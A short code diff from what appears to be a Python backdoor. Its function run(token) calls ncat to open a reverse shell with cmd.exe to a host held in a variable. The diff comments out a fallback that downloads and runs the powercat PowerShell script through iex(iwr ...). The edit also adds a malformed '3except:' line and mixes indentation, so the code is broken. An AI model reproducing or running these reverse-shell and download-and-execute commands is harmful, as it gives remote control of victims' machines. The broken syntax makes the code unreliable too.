@@ -73,5 +73,6 @@ def run(token):
         try:
 	   #os.system('ncat -lvp 734 -e cmd.exe')
             os.system('ncat '+ iph +' 734 -e cmd.exe')
-	except:
-	    os.system('iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
+	
+	3except:
+	   #os.system('iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
